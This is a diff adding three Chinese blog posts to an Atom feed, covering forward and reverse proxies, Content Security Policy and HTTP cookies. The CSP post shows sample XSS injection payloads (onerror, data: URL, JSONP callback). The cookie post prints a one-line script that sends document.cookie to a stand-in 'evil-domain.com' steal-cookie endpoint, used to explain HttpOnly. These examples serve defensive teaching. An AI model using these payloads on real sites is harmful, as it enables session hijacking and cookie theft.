@@ -2,13 +2,493 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://leecss.com</id>
     <title>当下</title>
-    <updated>2021-07-27T23:11:23.265Z</updated>
+    <updated>2021-08-07T14:57:28.684Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://leecss.com"/>
     <link rel="self" href="https://leecss.com/atom.xml"/>
     <logo>https://leecss.com/images/avatar.png</logo>
     <icon>https://leecss.com/favicon.ico</icon>
     <rights>All rights reserved 2021, 当下</rights>
+    <entry>
+        <title type="html"><![CDATA[http-正向代理和反向代理]]></title>
+        <id>https://leecss.com/post/http-zheng-xiang-dai-li-he-fan-xiang-dai-li/</id>
+        <link href="https://leecss.com/post/http-zheng-xiang-dai-li-he-fan-xiang-dai-li/">
+        </link>
+        <updated>2021-08-07T14:51:30.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="概述">概述</h2>
+<p>Web 上的代理服务器是代表客户端完成事务处理的中间人。如果没有 Web 代理， HTTP 客户端就要直接与 HTTP 服务器进行对话。有了 Web 代理，客户端就可以与代理进行对话，然后由代理代表客户端与服务器进行交流。客户端仍然会完成对事务的处理，但它是通过代理服务器提供的优质服务来实现的。</p>
+<p>HTTP 的代理服务器既是 Web 服务器又是 Web 客户端。HTTP 客户端会向代理发送请求报文，代理服务器必须像 Web 服务器一样，正确地处理请求和连接，然后返回响应。同时，代理自身要向服务器发送请求，这样，其行为就必须像正确的 HTTP 客户端一样，要发送请求并接收响应。如果要创建自己的 HTTP 代理，就要认真地遵循为 HTTP 客户端和 HTTP 服务器制定的规则。</p>
+<figure data-type="image" tabindex="1"><img src="https://leecss.com/post-images/1628347950236.webp" alt="" loading="lazy"></figure>
+<h2 id="类比学习">类比学习</h2>
+<h3 id="点餐">点餐</h3>
+<h4 id="没有代理">没有代理</h4>
+<p>假如餐厅是厨师自己开的，厨师自己做饭提供给客户，我们下单，然后厨师把饭提供给我们。</p>
+<p>我们是客户端，厨师是服务端，没有代理</p>
+<h4 id="正向代理">正向代理</h4>
+<p>假如餐厅中有一名厨师，和一名服务员，我们下单告诉服务员，服务员告诉厨师，厨师做好饭后交给服务员，服务员端给我们。</p>
+<p>我们是客户端，服务员是正向代理，厨师是服务端。</p>
+<p>在这个过程中，服务员代替我们去告诉厨师想要吃的饭，厨师只知道服务员，并不知道最终吃饭的人是谁。</p>
+<h4 id="反向代理">反向代理</h4>
+<p>假如餐厅中有一名服务员，下单系统，和多名厨师，我们下单告诉服务员，服务员在下单系统上提交菜品，下单系统按照忙闲情况分配了厨师。</p>
+<p>我们是客户端，服务员是正向代理，下单系统是反向代理，厨师是服务端</p>
+<p>在这个过程中，我们只知道是在下单系统上提交的订单，但是不知道是哪位厨师提供的</p>
+<h3 id="借钱">借钱</h3>
+<p><strong>假设由A、B和C三人，他们之间存在借钱的关系。</strong></p>
+<h4 id="正向代理-2">正向代理</h4>
+<ol>
+<li>A需要钱，A知道C由很多钱，想向C借钱</li>
+<li>但是A和C有矛盾，于是A想到通过B去借C借钱</li>
+<li>B向C借到钱了，C不知道是A的存在</li>
+<li>这样B就帮助A借到了Z的钱</li>
+</ol>
+<p>在这个过程，B就充当了代理借钱的角色，并且是代替A去借钱的，这样就是正向代理。</p>
+<figure data-type="image" tabindex="2"><img src="https://leecss.com/post-images/1628348139202.png" alt="" loading="lazy"></figure>
+<h4 id="反向代理-2">反向代理</h4>
+<ol>
+<li>A需要钱，C有很多钱，A不知道C很多钱</li>
+<li>A找B借钱</li>
+<li>B知道C有很多钱</li>
+<li>B向C借钱，并把借到的钱给A，而没有使用自己的钱借给A</li>
+<li>A拿到钱以后，以为钱是B的，A不知道C的存在</li>
+</ol>
+<p>在这个过程当中，B也充当了代理借钱的角色，不过这次不是代替A去借的，而是用C的钱借给A的，换言之即是代替C将钱借给了A，这就是反向代理。</p>
+<figure data-type="image" tabindex="3"><img src="https://leecss.com/post-images/1628348150291.png" alt="" loading="lazy"></figure>
+<h3 id="其他">其他</h3>
+<p>正向代理: 买票的黄牛</p>
+<p>反向代理: 租房的代理</p>
+<h2 id="正向代理-3">正向代理</h2>
+<p>是指是一个位于客户端和原始服务器之间的服务器，为了从原始服务器取得内容， 客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端才能使用正向代理。</p>
+<figure data-type="image" tabindex="4"><img src="https://leecss.com/post-images/1628348113934.png" alt="" loading="lazy"></figure>
+<h3 id="特点">特点</h3>
+<ol>
+<li>代理客户;</li>
+<li>隐藏真实的客户，为客户端收发请求，使真实客户端对服务器不可见;</li>
+<li>一个局域网内的所有用户可能被一台服务器做了正向代理，由该台服务器负责 HTTP 请求;</li>
+<li>意味着同服务器做通信的是正向代理服务器;</li>
+</ol>
+<h3 id="作用">作用</h3>
+<ol>
+<li>访问原来无法访问的资源，如google</li>
+<li>可以做缓存，加速访问资源</li>
+<li>对客户端访问授权，上网进行认证</li>
+<li>代理可以记录用户访问记录（上网行为管理），对外隐藏用户信息</li>
+</ol>
+<figure data-type="image" tabindex="5"><img src="https://leecss.com/post-images/1628348191475.jpg" alt="" loading="lazy"></figure>
+<h2 id="反向代理-3">反向代理</h2>
+<p>是指以代理服务器来接受 Internet 上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给 Internet 上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。</p>
+<figure data-type="image" tabindex="6"><img src="https://leecss.com/post-images/1628348098770.png" alt="" loading="lazy"></figure>
+<h3 id="特点-2">特点</h3>
+<ol>
+<li>代理服务器;</li>
+<li>隐藏了真实的服务器，为服务器收发请求，使真实服务器对客户端不可见;</li>
+<li>负载均衡服务器，将用户的请求分发到空闲的服务器上;</li>
+<li>意味着用户和负载均衡服务器直接通信，即用户解析服务器域名时得到的是负载均衡服务器的 IP ;</li>
+</ol>
+<h3 id="作用-2">作用</h3>
+<ol>
+<li>保证内网的安全，可以使用反向代理提供WAF功能，阻止web攻击</li>
+<li>负载均衡，通过反向代理服务器来优化网站的负载</li>
+</ol>
+<figure data-type="image" tabindex="7"><img src="https://leecss.com/post-images/1628348224249.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://leecss.com/post-images/1628348235535.jpg" alt="" loading="lazy"></figure>
+<h2 id="总结">总结</h2>
+<h3 id="共同点">共同点</h3>
+<ol>
+<li>都是做为服务器和客户端的中间层</li>
+<li>都可以加强内网的安全性，阻止 web 攻击</li>
+<li>都可以做缓存机制，提高访问速度</li>
+</ol>
+<h3 id="区别">区别</h3>
+<ol>
+<li>正向代理其实是客户端的代理,反向代理则是服务器的代理。</li>
+<li>正向代理中，服务器并不知道真正的客户端到底是谁；而在反向代理中，客户端也不知道真正的服务器是谁。</li>
+<li>作用不同。正向代理主要是用来解决访问限制问题；而反向代理则是提供负载均衡、安全防护等作用。</li>
+</ol>
+<h2 id="图解">图解</h2>
+<figure data-type="image" tabindex="9"><img src="https://leecss.com/post-images/1628348020634.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="https://leecss.com/post-images/1628348030926.png" alt="" loading="lazy"></figure>
+<h2 id="参考">参考</h2>
+<p><a href="https://mp.weixin.qq.com/s/U5N4okQin9CJ4Bbl6U2EDA">如何向老板解释反向代理</a></p>
+<p><a href="https://www.zhihu.com/question/24723688/answer/583903276">知乎-慕课网</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[http-Content Security Policy]]></title>
+        <id>https://leecss.com/post/http-content-security-policy/</id>
+        <link href="https://leecss.com/post/http-content-security-policy/">
+        </link>
+        <updated>2021-08-07T08:12:18.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="一-简介">一、简介</h2>
+<p>CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。</p>
+<p>CSP 大大增强了网页的安全性。攻击者即使发现了漏洞，也没法注入脚本，除非还控制了一台列入了白名单的可信主机。</p>
+<p>两种方法可以启用 CSP。一种是通过 HTTP 头信息的<code>Content-Security-Policy</code>的字段。</p>
+<pre><code class="language-http">Content-Security-Policy: script-src 'self'; object-src 'none';
+style-src cdn.example.org third-party.org; child-src https:
+</code></pre>
+<p>另一种是通过网页的<code>&lt;meta&gt;</code>标签。</p>
+<pre><code class="language-html">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:&quot;&gt;
+</code></pre>
+<p>上面代码中，CSP 做了如下配置。</p>
+<ul>
+<li>脚本：只信任当前域名</li>
+<li><code>&lt;object&gt;</code>标签：不信任任何URL，即不加载任何资源</li>
+<li>样式表：只信任<code>cdn.example.org</code>和<code>third-party.org</code></li>
+<li>框架（frame）：必须使用HTTPS协议加载</li>
+<li>其他资源：没有限制</li>
+</ul>
+<p>启用后，不符合 CSP 的外部资源就会被阻止加载。</p>
+<h2 id="二-限制选项">二、限制选项</h2>
+<p>CSP 提供了很多限制选项，涉及安全的各个方面。</p>
+<h3 id="资源加载限制">资源加载限制</h3>
+<p>以下选项限制各类资源的加载。</p>
+<ul>
+<li><code>script-src</code>：外部脚本</li>
+<li><code>style-src</code>：样式表</li>
+<li><code>img-src</code>：图像</li>
+<li><code>media-src</code>：媒体文件（音频和视频）</li>
+<li><code>font-src</code>：字体文件</li>
+<li><code>object-src</code>：插件（比如 Flash）</li>
+<li><code>child-src</code>：框架</li>
+<li><code>frame-ancestors</code>：嵌入的外部资源（比如<frame>、<iframe>、<embed>和<applet>）</li>
+<li><code>connect-src</code>：HTTP 连接（通过 XHR、WebSockets、EventSource等）</li>
+<li><code>worker-src</code>：<code>worker</code>脚本</li>
+<li><code>manifest-src</code>：manifest 文件</li>
+</ul>
+<h3 id="default-src">default-src</h3>
+<p><code>default-src</code>用来设置上面各个选项的默认值。</p>
+<pre><code class="language-http">Content-Security-Policy: default-src 'self'
+</code></pre>
+<p>上面代码限制所有的外部资源，都只能从当前域名加载。</p>
+<p>如果同时设置某个单项限制（比如<code>font-src</code>）和<code>default-src</code>，前者会覆盖后者，即字体文件会采用<code>font-src</code>的值，其他资源依然采用<code>default-src</code>的值。</p>
+<h3 id="url-限制">URL 限制</h3>
+<p>有时，网页会跟其他 URL 发生联系，这时也可以加以限制。</p>
+<ul>
+<li><code>frame-ancestors</code>：限制嵌入框架的网页</li>
+<li><code>base-uri</code>：限制<code>&lt;base#href&gt;</code></li>
+<li><code>form-action</code>：限制<code>&lt;form#action&gt;</code></li>
+</ul>
+<h3 id="其他限制">其他限制</h3>
+<p>其他一些安全相关的功能，也放在了 CSP 里面。</p>
+<ul>
+<li><code>block-all-mixed-content</code>：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）</li>
+<li><code>upgrade-insecure-requests</code>：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议</li>
+<li><code>plugin-types</code>：限制可以使用的插件格式</li>
+<li><code>sandbox</code>：浏览器行为的限制，比如不能有弹出窗口等。</li>
+</ul>
+<h3 id="report-uri">report-uri</h3>
+<p>有时，我们不仅希望防止 XSS，还希望记录此类行为。<code>report-uri</code>就用来告诉浏览器，应该把注入行为报告给哪个网址。</p>
+<pre><code class="language-http">Content-Security-Policy: default-src 'self'; ...; report-uri /my_amazing_csp_report_parser;
+</code></pre>
+<p>上面代码指定，将注入行为报告给<code>/my_amazing_csp_report_parser</code>这个 URL。</p>
+<p>浏览器会使用<code>POST</code>方法，发送一个JSON对象，下面是一个例子。</p>
+<pre><code class="language-json">{
+  &quot;csp-report&quot;: {
+    &quot;document-uri&quot;: &quot;http://example.org/page.html&quot;,
+    &quot;referrer&quot;: &quot;http://evil.example.com/&quot;,
+    &quot;blocked-uri&quot;: &quot;http://evil.example.com/evil.js&quot;,
+    &quot;violated-directive&quot;: &quot;script-src 'self' https://apis.google.com&quot;,
+    &quot;original-policy&quot;: &quot;script-src 'self' https://apis.google.com; report-uri http://example.org/my_amazing_csp_report_parser&quot;
+  }
+}
+</code></pre>
+<h2 id="三-content-security-policy-report-only">三、Content-Security-Policy-Report-Only</h2>
+<p>除了<code>Content-Security-Policy</code>，还有一个<code>Content-Security-Policy-Report-Only</code>字段，表示不执行限制选项，只是记录违反限制的行为。</p>
+<p>它必须与<code>report-uri</code>选项配合使用。</p>
+<pre><code class="language-http">Content-Security-Policy-Report-Only: default-src 'self'; ...; report-uri /my_amazing_csp_report_parser;
+</code></pre>
+<h2 id="四-选项值">四、选项值</h2>
+<p>每个限制选项可以设置以下几种值，这些值就构成了白名单。</p>
+<ul>
+<li>主机名：<code>example.org</code>，<code>https://example.com:443</code></li>
+<li>路径名：<code>example.org/resources/js/</code></li>
+<li>通配符：<code>*.example.org</code>，<code>*://*.example.com:*</code>（表示任意协议、任意子域名、任意端口）</li>
+<li>协议名：<code>https:</code>、<code>data:</code></li>
+<li>关键字<code>'self'</code>：当前域名，需要加引号</li>
+<li>关键字<code>'none'</code>：禁止加载任何外部资源，需要加引号</li>
+</ul>
+<p>多个值也可以并列，用空格分隔。</p>
+<pre><code class="language-http">Content-Security-Policy: script-src 'self' https://apis.google.com
+</code></pre>
+<p>如果同一个限制选项使用多次，只有第一次会生效。</p>
+<pre><code class="language-http"># 错误的写法
+script-src https://host1.com; script-src https://host2.com
+
+# 正确的写法
+script-src https://host1.com https://host2.com
+</code></pre>
+<p>如果不设置某个限制选项，就是默认允许任何值。</p>
+<h2 id="五-script-src-的特殊值">五、script-src 的特殊值</h2>
+<p>除了常规值，<code>script-src</code>还可以设置一些特殊值。注意，下面这些值都必须放在单引号里面。</p>
+<ul>
+<li><code>'unsafe-inline'</code>：允许执行页面内嵌的<code>&lt;script&gt;</code>标签和事件监听函数</li>
+<li><code>unsafe-eval</code>：允许将字符串当作代码执行，比如使用<code>eval</code>、<code>setTimeout</code>、<code>setInterval</code>和<code>Function</code>等函数。</li>
+<li>nonce值：每次HTTP回应给出一个授权token，页面内嵌脚本必须有这个token，才会执行</li>
+<li>hash值：列出允许执行的脚本代码的Hash值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行。</li>
+</ul>
+<p>nonce值的例子如下，服务器发送网页的时候，告诉浏览器一个随机生成的token。</p>
+<pre><code class="language-http">Content-Security-Policy: script-src 'nonce-EDNnf03nceIOfn39fn3e9h3sdfa'
+</code></pre>
+<p>页面内嵌脚本，必须有这个token才能执行。</p>
+<pre><code class="language-html">&lt;script nonce=EDNnf03nceIOfn39fn3e9h3sdfa&gt;
+  // some code
+&lt;/script&gt;
+</code></pre>
+<p>hash值的例子如下，服务器给出一个允许执行的代码的hash值。</p>
+<pre><code class="language-http">Content-Security-Policy: script-src 'sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng='
+</code></pre>
+<p>下面的代码就会允许执行，因为hash值相符。</p>
+<pre><code class="language-html">&lt;script&gt;alert('Hello, world.');&lt;/script&gt;
+</code></pre>
+<p>注意，计算hash值的时候，<script>标签不算在内。</p>
+<p>除了<code>script-src</code>选项，nonce值和hash值还可以用在<code>style-src</code>选项，控制页面内嵌的样式表。</p>
+<h2 id="六-注意点">六、注意点</h2>
+<p>（1）<code>script-src</code>和<code>object-src</code>是必设的，除非设置了<code>default-src</code>。</p>
+<p>因为攻击者只要能注入脚本，其他限制都可以规避。而<code>object-src</code>必设是因为 Flash 里面可以执行外部脚本。</p>
+<p>（2）<code>script-src</code>不能使用<code>unsafe-inline</code>关键字（除非伴随一个nonce值），也不能允许设置<code>data:</code>URL。</p>
+<p>下面是两个恶意攻击的例子。</p>
+<pre><code class="language-html">&lt;img src=&quot;x&quot; onerror=&quot;evil()&quot;&gt;
+&lt;script src=&quot;data:text/javascript,evil()&quot;&gt;&lt;/script&gt;
+</code></pre>
+<p>（3）必须特别注意 JSONP 的回调函数。</p>
+<pre><code class="language-html">&lt;script
+src=&quot;/path/jsonp?callback=alert(document.domain)//&quot;&gt;
+&lt;/script&gt;
+</code></pre>
+<p>上面的代码中，虽然加载的脚本来自当前域名，但是通过改写回调函数，攻击者依然可以执行恶意代码。</p>
+<h2 id="转载">转载</h2>
+<blockquote>
+<p>阮一峰</p>
+<p><a href="https://www.ruanyifeng.com/blog/2016/09/csp.html">https://www.ruanyifeng.com/blog/2016/09/csp.html</a></p>
+</blockquote>
+<h2 id="文档">文档</h2>
+<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy">MDN/HTTP/Headers/Content-Security-Policy</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[http-cookie]]></title>
+        <id>https://leecss.com/post/http-cookie/</id>
+        <link href="https://leecss.com/post/http-cookie/">
+        </link>
+        <updated>2021-08-04T14:33:34.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="概述">概述</h2>
+<p>Cookie 是服务器保存在浏览器的一小段文本信息，每个 Cookie 的大小一般不能超过4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。</p>
+<p>Cookie 主要用来分辨两个请求是否来自同一个浏览器，以及用来保存一些状态信息。它的常用场合有以下一些。</p>
+<ul>
+<li>对话（session）管理：保存登录、购物车等需要记录的信息。</li>
+<li>个性化：保存用户的偏好，比如网页的字体大小、背景色等等。</li>
+<li>追踪：记录和分析用户行为。</li>
+</ul>
+<p>有些开发者使用 Cookie 作为客户端储存。这样做虽然可行，但是并不推荐，因为 Cookie 的设计目标并不是这个，它的容量很小（4KB），缺乏数据操作接口，而且会影响性能。客户端储存应该使用 Web storage API 和 IndexedDB。</p>
+<p>Cookie 包含以下几方面的信息。</p>
+<ul>
+<li>Cookie 的名字</li>
+<li>Cookie 的值（真正的数据写在这里面）</li>
+<li>到期时间</li>
+<li>所属域名（默认是当前域名）</li>
+<li>生效的路径（默认是当前网址）</li>
+</ul>
+<p>举例来说，用户访问网址<code>www.example.com</code>，服务器在浏览器写入一个 Cookie。这个 Cookie 就会包含<code>www.example.com</code>这个域名，以及根路径<code>/</code>。这意味着，这个 Cookie 对该域名的根路径和它的所有子路径都有效。如果路径设为<code>/forums</code>，那么这个 Cookie 只有在访问<code>www.example.com/forums</code>及其子路径时才有效。以后，浏览器一旦访问这个路径，浏览器就会附上这段 Cookie 发送给服务器。</p>
+<p>浏览器可以设置不接受 Cookie，也可以设置不向服务器发送 Cookie。<code>window.navigator.cookieEnabled</code>属性返回一个布尔值，表示浏览器是否打开 Cookie 功能。</p>
+<pre><code class="language-js">// 浏览器是否打开 Cookie 功能
+window.navigator.cookieEnabled // true
+</code></pre>
+<p><code>document.cookie</code>属性返回当前网页的 Cookie。</p>
+<pre><code class="language-js">// 当前网页的 Cookie
+document.cookie
+</code></pre>
+<p>不同浏览器对 Cookie 数量和大小的限制，是不一样的。一般来说，单个域名设置的 Cookie 不应超过30个，每个 Cookie 的大小不能超过4KB。超过限制以后，Cookie 将被忽略，不会被设置。</p>
+<p>浏览器的同源政策规定，两个网址只要域名相同和端口相同，就可以共享 Cookie（参见《同源政策》一章）。注意，这里不要求协议相同。也就是说，<code>http://example.com</code>设置的 Cookie，可以被<code>https://example.com</code>读取。</p>
+<h2 id="来源">来源</h2>
+<p>HTTP 是一种不保存状态，即无状态（stateless）协议。HTTP 协议自身不对请求和响应之间的通信状态进行保存。也就是说在 HTTP 这个级别，协议对于发送过的请求或响应都不做持久化处理。</p>
+<p>使用 HTTP 协议，每当有新的请求发送时，就会有对应的新响应产生。协议本身并不保留之前一切的请求或响应报文的信息。这是为了更快地处理大量事务，确保协议的可伸缩性，而特意把 HTTP 协议设计成如此简单的。</p>
+<p>可是，随着 Web 的不断发展，因无状态而导致业务处理变得棘手的情况增多了。比如，用户登录到一家购物网站，即使他跳转到该站的其他页面后，也需要能继续保持登录状态。针对这个实例，网站为了能够掌握是谁送出的请求，需要保存用户的状态。</p>
+<p>HTTP/1.1 虽然是无状态协议，但为了实现期望的保持状态功能，于是引入了 Cookie 技术。有了 Cookie 再用 HTTP 协议通信，就可以管理状态了。</p>
+<p><strong>Cookie 的本职工作并非本地存储，而是“维持状态”</strong>。</p>
+<h2 id="原理">原理</h2>
+<p>cookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。</p>
+<p><strong>cookie是服务端生成，客户端进行维护和存储</strong>。</p>
+<p>第一次访问网站的时候，浏览器发出请求，服务器响应请求后，会在响应头里面添加一个Set-Cookie选项，将cookie放入到响应请求中，在浏览器第二次发请求的时候，会通过Cookie请求头部将Cookie信息发送给服务器，服务端会辨别用户身份，另外，Cookie的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。</p>
+<figure data-type="image" tabindex="1"><img src="https://leecss.com/post-images/1628169793793.jpg" alt="" loading="lazy"></figure>
+<h2 id="生成">生成</h2>
+<p>服务器如果希望在浏览器保存 Cookie，就要在 HTTP 回应的头信息里面，放置一个<code>Set-Cookie</code>字段。</p>
+<pre><code class="language-http">Set-Cookie:foo=bar
+</code></pre>
+<p>上面代码会在浏览器保存一个名为<code>foo</code>的 Cookie，它的值为<code>bar</code>。</p>
+<p>HTTP 回应可以包含多个<code>Set-Cookie</code>字段，即在浏览器生成多个 Cookie。下面是一个例子。</p>
+<pre><code class="language-http">HTTP/1.0 200 OK
+Content-type: text/html
+Set-Cookie: yummy_cookie=choco
+Set-Cookie: tasty_cookie=strawberry
+
+[page content]
+</code></pre>
+<p>除了 Cookie 的值，<code>Set-Cookie</code>字段还可以附加 Cookie 的属性。</p>
+<pre><code class="language-http">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Expires=&lt;date&gt;
+Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Max-Age=&lt;non-zero-digit&gt;
+Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;
+Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Path=&lt;path-value&gt;
+Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Secure
+Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; HttpOnly
+</code></pre>
+<p>上面的几个属性的含义，将在后文解释。</p>
+<p>一个<code>Set-Cookie</code>字段里面，可以同时包括多个属性，没有次序的要求。</p>
+<pre><code class="language-http">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;; Secure; HttpOnly
+</code></pre>
+<p>下面是一个例子。</p>
+<pre><code class="language-http">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
+</code></pre>
+<p>如果服务器想改变一个早先设置的 Cookie，必须同时满足四个条件：Cookie 的<code>key</code>、<code>domain</code>、<code>path</code>和<code>secure</code>都匹配。举例来说，如果原始的 Cookie 是用如下的<code>Set-Cookie</code>设置的。</p>
+<pre><code class="language-http">Set-Cookie: key1=value1; domain=example.com; path=/blog
+</code></pre>
+<p>改变上面这个 Cookie 的值，就必须使用同样的<code>Set-Cookie</code>。</p>
+<pre><code class="language-http">Set-Cookie: key1=value2; domain=example.com; path=/blog
+</code></pre>
+<p>只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。</p>
+<pre><code class="language-http">Set-Cookie: key1=value2; domain=example.com; path=/
+</code></pre>
+<p>上面的命令设置了一个全新的同名 Cookie，但是<code>path</code>属性不一样。下一次访问<code>example.com/blog</code>的时候，浏览器将向服务器发送两个同名的 Cookie。</p>
+<pre><code class="language-http">Cookie: key1=value1; key1=value2
+</code></pre>
+<p>上面代码的两个 Cookie 是同名的，匹配越精确的 Cookie 排在越前面。</p>
+<h3 id="demo-nodejs">demo-node.js</h3>
+<p>服务端返回数据的时候，通过 <strong>Set-Cookie</strong> ，保存到浏览器中。</p>
+<p>test.html</p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+  &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;
+  &lt;title&gt;Document&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;div&gt;Content&lt;/div&gt;
+&lt;/body&gt;
+&lt;script&gt;
+  console.log(document.cookie)
+&lt;/script&gt;
+&lt;/html&gt;
+</code></pre>
+<p>server.js</p>
+<pre><code class="language-js">const http = require('http')
+const fs = require('fs')
+
+http.createServer(function (request, response) {
+  console.log('request come', request.url)
+
+  if (request.url === '/') {
+    const html = fs.readFileSync('test.html', 'utf8')
+    response.writeHead(200, {
+      'Content-Type': 'text/html',
+      'Set-Cookie': ['id=123; max-age=2', 'abc=456;domain=test.com']
+    })
+    response.end(html)
+  }
+
+}).listen(8888)
+
+console.log('server listening on 8888')
+</code></pre>
+<h2 id="发送">发送</h2>
+<p>浏览器向服务器发送 HTTP 请求时，每个请求都会带上相应的 Cookie。也就是说，把服务器早前保存在浏览器的这段信息，再发回服务器。这时要使用 HTTP 头信息的<code>Cookie</code>字段。</p>
+<pre><code class="language-http">Cookie: foo=bar
+</code></pre>
+<p>上面代码会向服务器发送名为<code>foo</code>的 Cookie，值为<code>bar</code>。</p>
+<p><code>Cookie</code>字段可以包含多个 Cookie，使用分号（<code>;</code>）分隔。</p>
+<pre><code class="language-http">Cookie: name=value; name2=value2; name3=value3
+</code></pre>
+<p>下面是一个例子。</p>
+<pre><code class="language-http">GET /sample_page.html HTTP/1.1
+Host: www.example.org
+Cookie: yummy_cookie=choco; tasty_cookie=strawberry
+</code></pre>
+<p>服务器收到浏览器发来的 Cookie 时，有两点是无法知道的。</p>
+<ul>
+<li>Cookie 的各种属性，比如何时过期。</li>
+<li>哪个域名设置的 Cookie，到底是一级域名设的，还是某一个二级域名设的。</li>
+</ul>
+<h2 id="属性">属性</h2>
+<h3 id="expiresmax-age">Expires，Max-Age</h3>
+<p><code>Expires</code>属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 Cookie。它的值是 UTC 格式，可以使用<code>Date.prototype.toUTCString()</code>进行格式转换。</p>
+<pre><code class="language-http">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
+</code></pre>
+<p>如果不设置该属性，或者设为<code>null</code>，Cookie 只在当前会话（session）有效，浏览器窗口一旦关闭，当前 Session 结束，该 Cookie 就会被删除。另外，浏览器根据本地时间，决定 Cookie 是否过期，由于本地时间是不精确的，所以没有办法保证 Cookie 一定会在服务器指定的时间过期。</p>
+<p><code>Max-Age</code>属性指定从现在开始 Cookie 存在的秒数，比如<code>60 * 60 * 24 * 365</code>（即一年）。过了这个时间以后，浏览器就不再保留这个 Cookie。</p>
+<p>如果同时指定了<code>Expires</code>和<code>Max-Age</code>，那么<code>Max-Age</code>的值将优先生效。</p>
+<p>如果<code>Set-Cookie</code>字段没有指定<code>Expires</code>或<code>Max-Age</code>属性，那么这个 Cookie 就是 Session Cookie，即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个 Cookie。</p>
+<h3 id="domainpath">Domain，Path</h3>
+<p><code>Domain</code>属性指定浏览器发出 HTTP 请求时，哪些域名要附带这个 Cookie。如果没有指定该属性，浏览器会默认将其设为当前 URL 的一级域名，比如<code>www.example.com</code>会设为<code>example.com</code>，而且以后如果访问<code>example.com</code>的任何子域名，HTTP 请求也会带上这个 Cookie。如果服务器在<code>Set-Cookie</code>字段指定的域名，不属于当前域名，浏览器会拒绝这个 Cookie。</p>
+<p><code>Path</code>属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现，<code>Path</code>属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 Cookie。比如，<code>PATH</code>属性是<code>/</code>，那么请求<code>/docs</code>路径也会包含该 Cookie。当然，前提是域名必须一致。</p>
+<h3 id="securehttponly">Secure，HttpOnly</h3>
+<p><code>Secure</code>属性指定浏览器只有在加密协议 HTTPS 下，才能将这个 Cookie 发送到服务器。另一方面，如果当前协议是 HTTP，浏览器会自动忽略服务器发来的<code>Secure</code>属性。该属性只是一个开关，不需要指定值。如果通信是 HTTPS 协议，该开关自动打开。</p>
+<p><code>HttpOnly</code>属性指定该 Cookie 无法通过 JavaScript 脚本拿到，主要是<code>Document.cookie</code>属性、<code>XMLHttpRequest</code>对象和 Request API 都拿不到该属性。这样就防止了该 Cookie 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 Cookie。</p>
+<pre><code class="language-js">(new Image()).src = &quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot; + document.cookie;
+</code></pre>
+<p>上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 Cookie 发往第三方服务器。如果设置了一个 Cookie 的<code>HttpOnly</code>属性，上面代码就不会读到该 Cookie。</p>
+<h2 id="documentcookie">document.cookie</h2>
+<p><code>document.cookie</code>属性用于读写当前网页的 Cookie。</p>
+<p>读取的时候，它会返回当前网页的所有 Cookie，前提是该 Cookie 不能有<code>HTTPOnly</code>属性。</p>
+<pre><code class="language-js">document.cookie // &quot;foo=bar;baz=bar&quot;
+</code></pre>
+<p>上面代码从<code>document.cookie</code>一次性读出两个 Cookie，它们之间使用分号分隔。必须手动还原，才能取出每一个 Cookie 的值。</p>
+<pre><code class="language-js">var cookies = document.cookie.split(';');
+
+for (var i = 0; i &lt; cookies.length; i++) {
+  console.log(cookies[i]);
+}
+// foo=bar
+// baz=bar
+</code></pre>
